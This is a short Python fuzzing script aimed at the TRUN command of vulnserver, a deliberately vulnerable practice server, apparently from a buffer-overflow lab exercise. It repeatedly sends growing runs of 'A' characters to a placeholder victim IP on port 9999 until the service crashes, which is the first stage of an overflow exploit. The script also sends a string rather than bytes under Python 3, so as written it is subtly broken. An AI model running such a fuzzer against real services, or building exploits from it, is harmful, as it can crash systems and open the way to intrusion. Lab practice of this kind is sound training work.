#! /usr/bin/python
import sys
import socket
from time import sleep

buffer = "A" * 100
# Enter the port vulnserver is listening on
PORT = 9999
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("THE_VICTIM_IP", PORT))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print(f"Fuzzing crashed at {str(len(buffer))}")
        sys.exit()
